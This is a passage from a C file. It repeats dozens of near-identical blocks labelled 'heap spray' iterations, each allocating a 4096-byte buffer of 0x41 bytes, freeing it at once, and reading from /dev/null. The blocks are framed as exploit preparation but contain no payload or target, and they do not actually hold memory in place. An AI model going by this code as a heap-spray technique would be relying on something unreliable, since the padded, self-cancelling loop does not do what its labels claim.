    void *ptr385 = malloc(4096);
    if (ptr385) {
        memset(ptr385, 0x41, 4096);
        printf("[+] Allocated ptr385\\n");
        free(ptr385);
    }
    int fd385 = open("/dev/null", O_RDONLY);
    if (fd385 >= 0) {
        char buf385[256];
        read(fd385, buf385, sizeof(buf385));
        close(fd385);
    }
    // Iteration 387
    printf("[*] Heap spray iteration 387\\n");
    void *ptr386 = malloc(4096);
    if (ptr386) {
        memset(ptr386, 0x41, 4096);
        printf("[+] Allocated ptr386\\n");
        free(ptr386);
    }
    int fd386 = open("/dev/null", O_RDONLY);
    if (fd386 >= 0) {
        char buf386[256];
        read(fd386, buf386, sizeof(buf386));
        close(fd386);
    }
    // Iteration 388
    printf("[*] Heap spray iteration 388\\n");
    void *ptr387 = malloc(4096);
    if (ptr387) {
        memset(ptr387, 0x41, 4096);
        printf("[+] Allocated ptr387\\n");
        free(ptr387);
    }
    int fd387 = open("/dev/null", O_RDONLY);
    if (fd387 >= 0) {
        char buf387[256];
        read(fd387, buf387, sizeof(buf387));
        close(fd387);
    }
    // Iteration 389
    printf("[*] Heap spray iteration 389\\n");
    void *ptr388 = malloc(4096);
    if (ptr388) {
        memset(ptr388, 0x41, 4096);
        printf("[+] Allocated ptr388\\n");
        free(ptr388);
    }
    int fd388 = open("/dev/null", O_RDONLY);
    if (fd388 >= 0) {
        char buf388[256];
        read(fd388, buf388, sizeof(buf388));
        close(fd388);
    }
    // Iteration 390
    printf("[*] Heap spray iteration 390\\n");
    void *ptr389 = malloc(4096);
    if (ptr389) {
        memset(ptr389, 0x41, 4096);
        printf("[+] Allocated ptr389\\n");
        free(ptr389);
    }
    int fd389 = open("/dev/null", O_RDONLY);
    if (fd389 >= 0) {
        char buf389[256];
        read(fd389, buf389, sizeof(buf389));
        close(fd389);
    }
    // Iteration 391
    printf("[*] Heap spray iteration 391\\n");
    void *ptr390 = malloc(4096);
    if (ptr390) {
        memset(ptr390, 0x41, 4096);
        printf("[+] Allocated ptr390\\n");
        free(ptr390);
    }
    int fd390 = open("/dev/null", O_RDONLY);
    if (fd390 >= 0) {
        char buf390[256];
        read(fd390, buf390, sizeof(buf390));
        close(fd390);
    }
    // Iteration 392
    printf("[*] Heap spray iteration 392\\n");
    void *ptr391 = malloc(4096);
    if (ptr391) {
        memset(ptr391, 0x41, 4096);
        printf("[+] Allocated ptr391\\n");
        free(ptr391);
    }
    int fd391 = open("/dev/null", O_RDONLY);
    if (fd391 >= 0) {
        char buf391[256];
        read(fd391, buf391, sizeof(buf391));
        close(fd391);
    }
    // Iteration 393
    printf("[*] Heap spray iteration 393\\n");
    void *ptr392 = malloc(4096);
    if (ptr392) {
        memset(ptr392, 0x41, 4096);
        printf("[+] Allocated ptr392\\n");
        free(ptr392);
    }
    int fd392 = open("/dev/null", O_RDONLY);
    if (fd392 >= 0) {
        char buf392[256];
        read(fd392, buf392, sizeof(buf392));
        close(fd392);
    }
    // Iteration 394
    printf("[*] Heap spray iteration 394\\n");
    void *ptr393 = malloc(4096);
    if (ptr393) {
        memset(ptr393, 0x41, 4096);
        printf("[+] Allocated ptr393\\n");
        free(ptr393);
    }
    int fd393 = open("/dev/null", O_RDONLY);
    if (fd393 >= 0) {
        char buf393[256];
        read(fd393, buf393, sizeof(buf393));
        close(fd393);
    }
    // Iteration 395
    printf("[*] Heap spray iteration 395\\n");
    void *ptr394 = malloc(4096);
    if (ptr394) {
        memset(ptr394, 0x41, 4096);
        printf("[+] Allocated ptr394\\n");
        free(ptr394);
    }
    int fd394 = open("/dev/null", O_RDONLY);
    if (fd394 >= 0) {
        char buf394[256];
        read(fd394, buf394, sizeof(buf394));
        close(fd394);
    }
    // Iteration 396
    printf("[*] Heap spray iteration 396\\n");
    void *ptr395 = malloc(4096);
    if (ptr395) {
        memset(ptr395, 0x41, 4096);
        printf("[+] Allocated ptr395\\n");
        free(ptr395);
    }
    int fd395 = open("/dev/null", O_RDONLY);
    if (fd395 >= 0) {
        char buf395[256];
        read(fd395, buf395, sizeof(buf395));
        close(fd395);
    }
    // Iteration 397
    printf("[*] Heap spray iteration 397\\n");
    void *ptr396 = malloc(4096);
    if (ptr396) {
        memset(ptr396, 0x41, 4096);
        printf("[+] Allocated ptr396\\n");
        free(ptr396);
    }
    int fd396 = open("/dev/null", O_RDONLY);
    if (fd396 >= 0) {
        char buf396[256];
        read(fd396, buf396, sizeof(buf396));
        close(fd396);
    }
    // Iteration 398
    printf("[*] Heap spray iteration 398\\n");
    void *ptr397 = malloc(4096);
    if (ptr397) {
        memset(ptr397, 0x41, 4096);
        printf("[+] Allocated ptr397\\n");
        free(ptr397);
    }
    int fd397 = open("/dev/null", O_RDONLY);
    if (fd397 >= 0) {
        char buf397[256];
        read(fd397, buf397, sizeof(buf397));
        close(fd397);
    }
    // Iteration 399
    printf("[*] Heap spray iteration 399\\n");
    void *ptr398 = malloc(4096);
    if (ptr398) {
        memset(ptr398, 0x41, 4096);
        printf("[+] Allocated ptr398\\n");
        free(ptr398);
    }
    int fd398 = open("/dev/null", O_RDONLY);
    if (fd398 >= 0) {
        char buf398[256];
        read(fd398, buf398, sizeof(buf398));
        close(fd398);
    }
    // Iteration 400
    printf("[*] Heap spray iteration 400\\n");
    void *ptr399 = malloc(4096);
    if (ptr399) {
        memset(ptr399, 0x41, 4096);
        printf("[+] Allocated ptr399\\n");
        free(ptr399);
    }
    int fd399 = open("/dev/null", O_RDONLY);
    if (fd399 >= 0) {
        char buf399[256];
        read(fd399, buf399, sizeof(buf399));
        close(fd399);
    }
    // Iteration 401
    printf("[*] Heap spray iteration 401\\n");
    void *ptr400 = malloc(4096);
    if (ptr400) {
        memset(ptr400, 0x41, 4096);
        printf("[+] Allocated ptr400\\n");
        free(ptr400);
    }
    int fd400 = open("/dev/null", O_RDONLY);
    if (fd400 >= 0) {
        char buf400[256];
        read(fd400, buf400, sizeof(buf400));
        close(fd400);
    }
    // Iteration 402
    printf("[*] Heap spray iteration 402\\n");
    void *ptr401 = malloc(4096);
    if (ptr401) {
        memset(ptr401, 0x41, 4096);
        printf("[+] Allocated ptr401\\n");
        free(ptr401);
    }
    int fd401 = open("/dev/null", O_RDONLY);
    if (fd401 >= 0) {
        char buf401[256];
        read(fd401, buf401, sizeof(buf401));
        close(fd401);
    }
    // Iteration 403
    printf("[*] Heap spray iteration 403\\n");
    void *ptr402 = malloc(4096);
    if (ptr402) {
        memset(ptr402, 0x41, 4096);
        printf("[+] Allocated ptr402\\n");
        free(ptr402);
    }
    int fd402 = open("/dev/null", O_RDONLY);
    if (fd402 >= 0) {
        char buf402[256];
        read(fd402, buf402, sizeof(buf402));
        close(fd402);
    }
    // Iteration 404
    printf("[*] Heap spray iteration 404\\n");
    void *ptr403 = malloc(4096);
    if (ptr403) {
        memset(ptr403, 0x41, 4096);
        printf("[+] Allocated ptr403\\n");
        free(ptr403);
    }
    int fd403 = open("/dev/null", O_RDONLY);
    if (fd403 >= 0) {
        char buf403[256];
        read(fd403, buf403, sizeof(buf403));
        close(fd403);
    }
    // Iteration 405
    printf("[*] Heap spray iteration 405\\n");
    void *ptr404 = malloc(4096);
    if (ptr404) {
        memset(ptr404, 0x41, 4096);
        printf("[+] Allocated ptr404\\n");
        free(ptr404);
    }
    int fd404 = open("/dev/null", O_RDONLY);
    if (fd404 >= 0) {
        char buf404[256];
        read(fd404, buf404, sizeof(buf404));
        close(fd404);
    }
    // Iteration 406
    printf("[*] Heap spray iteration 406\\n");
    void *ptr405 = malloc(4096);
    if (ptr405) {
        memset(ptr405, 0x41, 4096);
        printf("[+] Allocated ptr405\\n");
        free(ptr405);
    }
    int fd405 = open("/dev/null", O_RDONLY);
    if (fd405 >= 0) {
        char buf405[256];
        read(fd405, buf405, sizeof(buf405));
        close(fd405);
    }
    // Iteration 407
    printf("[*] Heap spray iteration 407\\n");
    void *ptr406 = malloc(4096);
    if (ptr406) {
        memset(ptr406, 0x41, 4096);
        printf("[+] Allocated ptr406\\n");
        free(ptr406);
    }
    int fd406 = open("/dev/null", O_RDONLY);
    if (fd406 >= 0) {
        char buf406[256];
        read(fd406, buf406, sizeof(buf406));
        close(fd406);
    }
    // Iteration 408
    printf("[*] Heap spray iteration 408\\n");
    void *ptr407 = malloc(4096);
    if (ptr407) {
        memset(ptr407, 0x41, 4096);
        printf("[+] Allocated ptr407\\n");
        free(ptr407);
    }
    int fd407 = open("/dev/null", O_RDONLY);
    if (fd407 >= 0) {
        char buf407[256];
        read(fd407, buf407, sizeof(buf407));
        close(fd407);
    }
    // Iteration 409
    printf("[*] Heap spray iteration 409\\n");
    void *ptr408 = malloc(4096);
    if (ptr408) {
        memset(ptr408, 0x41, 4096);
        printf("[+] Allocated ptr408\\n");
        free(ptr408);
    }
    int fd408 = open("/dev/null", O_RDONLY);
    if (fd408 >= 0) {
        char buf408[256];
        read(fd408, buf408, sizeof(buf408));
        close(fd408);
    }
    // Iteration 410
    printf("[*] Heap spray iteration 410\\n");
    void *ptr409 = malloc(4096);
    if (ptr409) {
        memset(ptr409, 0x41, 4096);
        printf("[+] Allocated ptr409\\n");
        free(ptr409);
    }
    int fd409 = open("/dev/null", O_RDONLY);
    if (fd409 >= 0) {
        char buf409[256];
        read(fd409, buf409, sizeof(buf409));
        close(fd409);
    }
    // Iteration 411
    printf("[*] Heap spray iteration 411\\n");
    void *ptr410 = malloc(4096);
    if (ptr410) {
        memset(ptr410, 0x41, 4096);
        printf("[+] Allocated ptr410\\n");
        free(ptr410);
    }
    int fd410 = open("/dev/null", O_RDONLY);
    if (fd410 >= 0) {
        char buf410[256];
        read(fd410, buf410, sizeof(buf410));
        close(fd410);
    }
    // Iteration 412
    printf("[*] Heap spray iteration 412\\n");
    void *ptr411 = malloc(4096);
    if (ptr411) {
        memset(ptr411, 0x41, 4096);
        printf("[+] Allocated ptr411\\n");
        free(ptr411);
    }
    int fd411 = open("/dev/null", O_RDONLY);
    if (fd411 >= 0) {
        char buf411[256];
        read(fd411, buf411, sizeof(buf411));
        close(fd411);
    }
    // Iteration 413
    printf("[*] Heap spray iteration 413\\n");
    void *ptr412 = malloc(4096);
    if (ptr412) {
        memset(ptr412, 0x41, 4096);
        printf("[+] Allocated ptr412\\n");
        free(ptr412);
    }
    int fd412 = open("/dev/null", O_RDONLY);
    if (fd412 >= 0) {
        char buf412[256];
        read(fd412, buf412, sizeof(buf412));
        close(fd412);
    }
    // Iteration 414
    printf("[*] Heap spray iteration 414\\n");
    void *ptr413 = malloc(4096);
    if (ptr413) {
        memset(ptr413, 0x41, 4096);
        printf("[+] Allocated ptr413\\n");
        free(ptr413);
    }
    int fd413 = open("/dev/null", O_RDONLY);
    if (fd413 >= 0) {
        char buf413[256];
        read(fd413, buf413, sizeof(buf413));
        close(fd413);
    }
    // Iteration 415
    printf("[*] Heap spray iteration 415\\n");
    void *ptr414 = malloc(4096);
    if (ptr414) {
        memset(ptr414, 0x41, 4096);
        printf("[+] Allocated ptr414\\n");
        free(ptr414);
    }
    int fd414 = open("/dev/null", O_RDONLY);
    if (fd414 >= 0) {
        char buf414[256];
        read(fd414, buf414, sizeof(buf414));
        close(fd414);
    }
    // Iteration 416
    printf("[*] Heap spray iteration 416\\n");
    void *ptr415 = malloc(4096);
    if (ptr415) {
        memset(ptr415, 0x41, 4096);
        printf("[+] Allocated ptr415\\n");
        free(ptr415);
    }
    int fd415 = open("/dev/null", O_RDONLY);
    if (fd415 >= 0) {
        char buf415[256];
        read(fd415, buf415, sizeof(buf415));
        close(fd415);
    }
    // Iteration 417
    printf("[*] Heap spray iteration 417\\n");
    void *ptr416 = malloc(4096);
    if (ptr416) {
        memset(ptr416, 0x41, 4096);
        printf("[+] Allocated ptr416\\n");
        free(ptr416);
    }
    int fd416 = open("/dev/null", O_RDONLY);
    if (fd416 >= 0) {
        char buf416[256];
        read(fd416, buf416, sizeof(buf416));
        close(fd416);
    }
    // Iteration 418
    printf("[*] Heap spray iteration 418\\n");
    void *ptr417 = malloc(4096);
    if (ptr417) {
        memset(ptr417, 0x41, 4096);
        printf("[+] Allocated ptr417\\n");
        free(ptr417);
    }
    int fd417 = open("/dev/null", O_RDONLY);
    if (fd417 >= 0) {
        char buf417[256];
        read(fd417, buf417, sizeof(buf417));
        close(fd417);
    }
    // Iteration 419
    printf("[*] Heap spray iteration 419\\n");
    void *ptr418 = malloc(4096);
    if (ptr418) {
        memset(ptr418, 0x41, 4096);
        printf("[+] Allocated ptr418\\n");
        free(ptr418);
    }
    int fd418 = open("/dev/null", O_RDONLY);
    if (fd418 >= 0) {
        char buf418[256];
        read(fd418, buf418, sizeof(buf418));
        close(fd418);
    }
    // Iteration 420
    printf("[*] Heap spray iteration 420\\n");
    void *ptr419 = malloc(4096);
    if (ptr419) {
        memset(ptr419, 0x41, 4096);
        printf("[+] Allocated ptr419\\n");
        free(ptr419);
    }
    int fd419 = open("/dev/null", O_RDONLY);
    if (fd419 >= 0) {
        char buf419[256];
        read(fd419, buf419, sizeof(buf419));
        close(fd419);
    }
    // Iteration 421
    printf("[*] Heap spray iteration 421\\n");
    void *ptr420 = malloc(4096);
    if (ptr420) {
        memset(ptr420, 0x41, 4096);
        printf("[+] Allocated ptr420\\n");
        free(ptr420);
    }
    int fd420 = open("/dev/null", O_RDONLY);
    if (fd420 >= 0) {
        char buf420[256];
        read(fd420, buf420, sizeof(buf420));
        close(fd420);
    }
    // Iteration 422
    printf("[*] Heap spray iteration 422\\n");
    void *ptr421 = malloc(4096);
    if (ptr421) {
        memset(ptr421, 0x41, 4096);
        printf("[+] Allocated ptr421\\n");
        free(ptr421);
    }
    int fd421 = open("/dev/null", O_RDONLY);
    if (fd421 >= 0) {
        char buf421[256];
        read(fd421, buf421, sizeof(buf421));
        close(fd421);
    }
    // Iteration 423
    printf("[*] Heap spray iteration 423\\n");
    void *ptr422 = malloc(4096);
    if (ptr422) {
        memset(ptr422, 0x41, 4096);
        printf("[+] Allocated ptr422\\n");
        free(ptr422);
    }
    int fd422 = open("/dev/null", O_RDONLY);
    if (fd422 >= 0) {
        char buf422[256];
        read(fd422, buf422, sizeof(buf422));
        close(fd422);
    }
    // Iteration 424
    printf("[*] Heap spray iteration 424\\n");
    void *ptr423 = malloc(4096);
    if (ptr423) {
        memset(ptr423, 0x41, 4096);
        printf("[+] Allocated ptr423\\n");
        free(ptr423);
    }
    int fd423 = open("/dev/null", O_RDONLY);
    if (fd423 >= 0) {
        char buf423[256];
        read(fd423, buf423, sizeof(buf423));
        close(fd423);
    }
    // Iteration 425
    printf("[*] Heap spray iteration 425\\n");
    void *ptr424 = malloc(4096);
    if (ptr424) {
        memset(ptr424, 0x41, 4096);
        printf("[+] Allocated ptr424\\n");
        free(ptr424);
    }
    int fd424 = open("/dev/null", O_RDONLY);
    if (fd424 >= 0) {
        char buf424[256];
        read(fd424, buf424, sizeof(buf424));
        close(fd424);
    }
    // Iteration 426
    printf("[*] Heap spray iteration 426\\n");
    void *ptr425 = malloc(4096);
    if (ptr425) {
        memset(ptr425, 0x41, 4096);
        printf("[+] Allocated ptr425\\n");
        free(ptr425);
    }
    int fd425 = open("/dev/null", O_RDONLY);
    if (fd425 >= 0) {
        char buf425[256];
        read(fd425, buf425, sizeof(buf425));
        close(fd425);
    }
    // Iteration 427
    printf("[*] Heap spray iteration 427\\n");
    void *ptr426 = malloc(4096);
    if (ptr426) {
        memset(ptr426, 0x41, 4096);
        printf("[+] Allocated ptr426\\n");
        free(ptr426);
    }
    int fd426 = open("/dev/null", O_RDONLY);
    if (fd426 >= 0) {
        char buf426[256];
        read(fd426, buf426, sizeof(buf426));
        close(fd426);
    }
    // Iteration 428
    printf("[*] Heap spray iteration 428\\n");
    void *ptr427 = malloc(4096);
    if (ptr427) {
        memset(ptr427, 0x41, 4096);
        printf("[+] Allocated ptr427\\n");
        free(ptr427);
    }
    int fd427 = open("/dev/null", O_RDONLY);
    if (fd427 >= 0) {
        char buf427[256];
        read(fd427, buf427, sizeof(buf427));
        close(fd427);
    }
    // Iteration 429
    printf("[*] Heap spray iteration 429\\n");
    void *ptr428 = malloc(4096);
    if (ptr428) {
        memset(ptr428, 0x41, 4096);
        printf("[+] Allocated ptr428\\n");
        free(ptr428);
    }
    int fd428 = open("/dev/null", O_RDONLY);
    if (fd428 >= 0) {
        char buf428[256];
        read(fd428, buf428, sizeof(buf428));
        close(fd428);
    }
    // Iteration 430
    printf("[*] Heap spray iteration 430\\n");
    void *ptr429 = malloc(4096);
    if (ptr429) {
        memset(ptr429, 0x41, 4096);
        printf("[+] Allocated ptr429\\n");
        free(ptr429);
    }
    int fd429 = open("/dev/null", O_RDONLY);
    if (fd429 >= 0) {
        char buf429[256];
        read(fd429, buf429, sizeof(buf429));
        close(fd429);
    }
    // Iteration 431
    printf("[*] Heap spray iteration 431\\n");
    void *ptr430 = malloc(4096);
    if (ptr430) {
        memset(ptr430, 0x41, 4096);
        printf("[+] Allocated ptr430\\n");
        free(ptr430);
    }
    int fd430 = open("/dev/null", O_RDONLY);
    if (fd430 >= 0) {
        char buf430[256];
        read(fd430, buf430, sizeof(buf430));
        close(fd430);
    }
    // Iteration 432
    printf("[*] Heap spray iteration 432\\n");
    void *ptr431 = malloc(4096);
    if (ptr431) {
        memset(ptr431, 0x41, 4096);
        printf("[+] Allocated ptr431\\n");
        free(ptr431);
    }
    int fd431 = open("/dev/null", O_RDONLY);
    if (fd431 >= 0) {
        char buf431[256];
        read(fd431, buf431, sizeof(buf431));
        close(fd431);
    }
    // Iteration 433
    printf("[*] Heap spray iteration 433\\n");
    void *ptr432 = malloc(4096);
    if (ptr432) {
        memset(ptr432, 0x41, 4096);
        printf("[+] Allocated ptr432\\n");
        free(ptr432);
    }
    int fd432 = open("/dev/null", O_RDONLY);
    if (fd432 >= 0) {
        char buf432[256];
        read(fd432, buf432, sizeof(buf432));
        close(fd432);
    }
    // Iteration 434
    printf("[*] Heap spray iteration 434\\n");
    void *ptr433 = malloc(4096);
    if (ptr433) {
        memset(ptr433, 0x41, 4096);
        printf("[+] Allocated ptr433\\n");
        free(ptr433);
    }
    int fd433 = open("/dev/null", O_RDONLY);
    if (fd433 >= 0) {
        char buf433[256];
        read(fd433, buf433, sizeof(buf433));
        close(fd433);
    }
    // Iteration 435
    printf("[*] Heap spray iteration 435\\n");
    void *ptr434 = malloc(4096);
    if (ptr434) {
        memset(ptr434, 0x41, 4096);
        printf("[+] Allocated ptr434\\n");
        free(ptr434);
    }
    int fd434 = open("/dev/null", O_RDONLY);
    if (fd434 >= 0) {
        char buf434[256];
        read(fd434, buf434, sizeof(buf434));
        close(fd434);
    }
    // Iteration 436
    printf("[*] Heap spray iteration 436\\n");
    void *ptr435 = malloc(4096);
    if (ptr435) {
        memset(ptr435, 0x41, 4096);
        printf("[+] Allocated ptr435\\n");
        free(ptr435);
    }
    int fd435 = open("/dev/null", O_RDONLY);
    if (fd435 >= 0) {
        char buf435[256];
        read(fd435, buf435, sizeof(buf435));
        close(fd435);
    }
    // Iteration 437
    printf("[*] Heap spray iteration 437\\n");
    void *ptr436 = malloc(4096);
    if (ptr436) {
        memset(ptr436, 0x41, 4096);
        printf("[+] Allocated ptr436\\n");
        free(ptr436);
    }
    int fd436 = open("/dev/null", O_RDONLY);
    if (fd436 >= 0) {
        char buf436[256];
        read(fd436, buf436, sizeof(buf436));
        close(fd436);
    }
    // Iteration 438
    printf("[*] Heap spray iteration 438\\n");
    void *ptr437 = malloc(4096);
    if (ptr437) {
        memset(ptr437, 0x41, 4096);
        printf("[+] Allocated ptr437\\n");
        free(ptr437);
    }
    int fd437 = open("/dev/null", O_RDONLY);
    if (fd437 >= 0) {
        char buf437[256];
        read(fd437, buf437, sizeof(buf437));
        close(fd437);
    }
    // Iteration 439
    printf("[*] Heap spray iteration 439\\n");
    void *ptr438 = malloc(4096);
    if (ptr438) {
        memset(ptr438, 0x41, 4096);
        printf("[+] Allocated ptr438\\n");
        free(ptr438);
    }
    int fd438 = open("/dev/null", O_RDONLY);
    if (fd438 >= 0) {
        char buf438[256];
        read(fd438, buf438, sizeof(buf438));
        close(fd438);
    }
    // Iteration 440
    printf("[*] Heap spray iteration 440\\n");
    void *ptr439 = malloc(4096);
    if (ptr439) {
        memset(ptr439, 0x41, 4096);
        printf("[+] Allocated ptr439\\n");
        free(ptr439);
    }
    int fd439 = open("/dev/null", O_RDONLY);
    if (fd439 >= 0) {
        char buf439[256];
        read(fd439, buf439, sizeof(buf439));
        close(fd439);
    }
    // Iteration 441
    printf("[*] Heap spray iteration 441\\n");
    void *ptr440 = malloc(4096);
    if (ptr440) {
        memset(ptr440, 0x41, 4096);
        printf("[+] Allocated ptr440\\n");
        free(ptr440);
    }
    int fd440 = open("/dev/null", O_RDONLY);
    if (fd440 >= 0) {
        char buf440[256];
        read(fd440, buf440, sizeof(buf440));
        close(fd440);
    }
    // Iteration 442
    printf("[*] Heap spray iteration 442\\n");
    void *ptr441 = malloc(4096);
    if (ptr441) {
        memset(ptr441, 0x41, 4096);
        printf("[+] Allocated ptr441\\n");
        free(ptr441);
    }
    int fd441 = open("/dev/null", O_RDONLY);
    if (fd441 >= 0) {
        char buf441[256];
        read(fd441, buf441, sizeof(buf441));
        close(fd441);
    }
    // Iteration 443
    printf("[*] Heap spray iteration 443\\n");
    void *ptr442 = malloc(4096);
    if (ptr442) {
        memset(ptr442, 0x41, 4096);
        printf("[+] Allocated ptr442\\n");
        free(ptr442);
    }
    int fd442 = open("/dev/null", O_RDONLY);
    if (fd442 >= 0) {
        char buf442[256];
        read(fd442, buf442, sizeof(buf442));
        close(fd442);
    }
    // Iteration 444
    printf("[*] Heap spray iteration 444\\n");
    void *ptr443 = malloc(4096);
    if (ptr443) {
        memset(ptr443, 0x41, 4096);
        printf("[+] Allocated ptr443\\n");
        free(ptr443);
    }
    int fd443 = open("/dev/null", O_RDONLY);
    if (fd443 >= 0) {
        char buf443[256];
        read(fd443, buf443, sizeof(buf443));
        close(fd443);
    }
    // Iteration 445
    printf("[*] Heap spray iteration 445\\n");
    void *ptr444 = malloc(4096);
    if (ptr444) {
        memset(ptr444, 0x41, 4096);
        printf("[+] Allocated ptr444\\n");
        free(ptr444);
    }
    int fd444 = open("/dev/null", O_RDONLY);
    if (fd444 >= 0) {
        char buf444[256];
        read(fd444, buf444, sizeof(buf444));
        close(fd444);
    }
    // Iteration 446
    printf("[*] Heap spray iteration 446\\n");
    void *ptr445 = malloc(4096);
    if (ptr445) {
        memset(ptr445, 0x41, 4096);
        printf("[+] Allocated ptr445\\n");
        free(ptr445);
    }
    int fd445 = open("/dev/null", O_RDONLY);
    if (fd445 >= 0) {
        char buf445[256];
        read(fd445, buf445, sizeof(buf445));
        close(fd445);
    }
    // Iteration 447
    printf("[*] Heap spray iteration 447\\n");
    void *ptr446 = malloc(4096);
    if (ptr446) {
        memset(ptr446, 0x41, 4096);
        printf("[+] Allocated ptr446\\n");
        free(ptr446);
    }
    int fd446 = open("/dev/null", O_RDONLY);
    if (fd446 >= 0) {
        char buf446[256];
        read(fd446, buf446, sizeof(buf446));
        close(fd446);
    }
    // Iteration 448
    printf("[*] Heap spray iteration 448\\n");
    void *ptr447 = malloc(4096);
    if (ptr447) {
        memset(ptr447, 0x41, 4096);
        printf("[+] Allocated ptr447\\n");
        free(ptr447);
    }
    int fd447 = open("/dev/null", O_RDONLY);
    if (fd447 >= 0) {
        char buf447[256];
        read(fd447, buf447, sizeof(buf447));
        close(fd447);
    }
    // Iteration 449
    printf("[*] Heap spray iteration 449\\n");
    void *ptr448 = malloc(4096);
    if (ptr448) {
        memset(ptr448, 0x41, 4096);
        printf("[+] Allocated ptr448\\n");
        free(ptr448);
    }
    int fd448 = open("/dev/null", O_RDONLY);
    if (fd448 >= 0) {
        char buf448[256];
        read(fd448, buf448, sizeof(buf448));
        close(fd448);
    }
    // Iteration 450
    printf("[*] Heap spray iteration 450\\n");
    void *ptr449 = malloc(4096);
    if (ptr449) {
        memset(ptr449, 0x41, 4096);
        printf("[+] Allocated ptr449\\n");
        free(ptr449);
    }
    int fd449 = open("/dev/null", O_RDONLY);
    if (fd449 >= 0) {
        char buf449[256];
        read(fd449, buf449, sizeof(buf449));
        close(fd449);
    }
    // Iteration 451
    printf("[*] Heap spray iteration 451\\n");
    void *ptr450 = malloc(4096);
    if (ptr450) {
        memset(ptr450, 0x41, 4096);
        printf("[+] Allocated ptr450\\n");
        free(ptr450);
    }
    int fd450 = open("/dev/null", O_RDONLY);
    if (fd450 >= 0) {
        char buf450[256];
        read(fd450, buf450, sizeof(buf450));
        close(fd450);
    }
    // Iteration 452
    printf("[*] Heap spray iteration 452\\n");
    void *ptr451 = malloc(4096);
    if (ptr451) {
        memset(ptr451, 0x41, 4096);
        printf("[+] Allocated ptr451\\n");
        free(ptr451);
    }
    int fd451 = open("/dev/null", O_RDONLY);
    if (fd451 >= 0) {
        char buf451[256];
        read(fd451, buf451, sizeof(buf451));
        close(fd451);
    }
    // Iteration 453
    printf("[*] Heap spray iteration 453\\n");
    void *ptr452 = malloc(4096);
    if (ptr452) {
        memset(ptr452, 0x41, 4096);
        printf("[+] Allocated ptr452\\n");
        free(ptr452);
    }
    int fd452 = open("/dev/null", O_RDONLY);
    if (fd452 >= 0) {
        char buf452[256];
        read(fd452, buf452, sizeof(buf452));
        close(fd452);
    }
    // Iteration 454
    printf("[*] Heap spray iteration 454\\n");
    void *ptr453 = malloc(4096);
    if (ptr453) {
        memset(ptr453, 0x41, 4096);
        printf("[+] Allocated ptr453\\n");
        free(ptr453);
    }
    int fd453 = open("/dev/null", O_RDONLY);
    if (fd453 >= 0) {
        char buf453[256];
        read(fd453, buf453, sizeof(buf453));
        close(fd453);
    }
    // Iteration 455
    printf("[*] Heap spray iteration 455\\n");
    void *ptr454 = malloc(4096);
    if (ptr454) {
        memset(ptr454, 0x41, 4096);
        printf("[+] Allocated ptr454\\n");
        free(ptr454);
    }
    int fd454 = open("/dev/null", O_RDONLY);
    if (fd454 >= 0) {
        char buf454[256];
        read(fd454, buf454, sizeof(buf454));
        close(fd454);
    }
    // Iteration 456
    printf("[*] Heap spray iteration 456\\n");
    void *ptr455 = malloc(4096);
    if (ptr455) {
        memset(ptr455, 0x41, 4096);
        printf("[+] Allocated ptr455\\n");
        free(ptr455);
    }
    int fd455 = open("/dev/null", O_RDONLY);
    if (fd455 >= 0) {
        char buf455[256];
        read(fd455, buf455, sizeof(buf455));
        close(fd455);
    }
    // Iteration 457
    printf("[*] Heap spray iteration 457\\n");
    void *ptr456 = malloc(4096);
    if (ptr456) {
        memset(ptr456, 0x41, 4096);
        printf("[+] Allocated ptr456\\n");
        free(ptr456);
    }
    int fd456 = open("/dev/null", O_RDONLY);
    if (fd456 >= 0) {
        char buf456[256];
        read(fd456, buf456, sizeof(buf456));
        close(fd456);
    }
    // Iteration 458
    printf("[*] Heap spray iteration 458\\n");
    void *ptr457 = malloc(4096);
    if (ptr457) {
        memset(ptr457, 0x41, 4096);
        printf("[+] Allocated ptr457\\n");
        free(ptr457);
    }
    int fd457 = open("/dev/null", O_RDONLY);
    if (fd457 >= 0) {
        char buf457[256];
        read(fd457, buf457, sizeof(buf457));
        close(fd457);
    }
    // Iteration 459
    printf("[*] Heap spray iteration 459\\n");
    void *ptr458 = malloc(4096);
    if (ptr458) {
        memset(ptr458, 0x41, 4096);
        printf("[+] Allocated ptr458\\n");
        free(ptr458);
    }
    int fd458 = open("/dev/null", O_RDONLY);
    if (fd458 >= 0) {
        char buf458[256];
        read(fd458, buf458, sizeof(buf458));
        close(fd458);
    }
    // Iteration 460
    printf("[*] Heap spray iteration 460\\n");
    void *ptr459 = malloc(4096);
    if (ptr459) {
        memset(ptr459, 0x41, 4096);
        printf("[+] Allocated ptr459\\n");
        free(ptr459);
    }
    int fd459 = open("/dev/null", O_RDONLY);
    if (fd459 >= 0) {
        char buf459[256];
        read(fd459, buf459, sizeof(buf459));
        close(fd459);
    }
    // Iteration 461
    printf("[*] Heap spray iteration 461\\n");
    void *ptr460 = malloc(4096);
    if (ptr460) {
        memset(ptr460, 0x41, 4096);
        printf("[+] Allocated ptr460\\n");
        free(ptr460);
    }
    int fd460 = open("/dev/null", O_RDONLY);
    if (fd460 >= 0) {
        char buf460[256];
        read(fd460, buf460, sizeof(buf460));
        close(fd460);
    }
    // Iteration 462
    printf("[*] Heap spray iteration 462\\n");
    void *ptr461 = malloc(4096);
    if (ptr461) {
        memset(ptr461, 0x41, 4096);
        printf("[+] Allocated ptr461\\n");
        free(ptr461);
    }
    int fd461 = open("/dev/null", O_RDONLY);
    if (fd461 >= 0) {
        char buf461[256];
        read(fd461, buf461, sizeof(buf461));
        close(fd461);
    }
    // Iteration 463
    printf("[*] Heap spray iteration 463\\n");
    void *ptr462 = malloc(4096);
    if (ptr462) {
        memset(ptr462, 0x41, 4096);
        printf("[+] Allocated ptr462\\n");
        free(ptr462);
    }
    int fd462 = open("/dev/null", O_RDONLY);
    if (fd462 >= 0) {
        char buf462[256];
        read(fd462, buf462, sizeof(buf462));
        close(fd462);
    }
    // Iteration 464
    printf("[*] Heap spray iteration 464\\n");
    void *ptr463 = malloc(4096);
    if (ptr463) {
        memset(ptr463, 0x41, 4096);
        printf("[+] Allocated ptr463\\n");
        free(ptr463);
    }
    int fd463 = open("/dev/null", O_RDONLY);
    if (fd463 >= 0) {
        char buf463[256];
        read(fd463, buf463, sizeof(buf463));
        close(fd463);
    }
    // Iteration 465
    printf("[*] Heap spray iteration 465\\n");
    void *ptr464 = malloc(4096);
    if (ptr464) {
        memset(ptr464, 0x41, 4096);
        printf("[+] Allocated ptr464\\n");
        free(ptr464);
    }
    int fd464 = open("/dev/null", O_RDONLY);
    if (fd464 >= 0) {
        char buf464[256];
        read(fd464, buf464, sizeof(buf464));
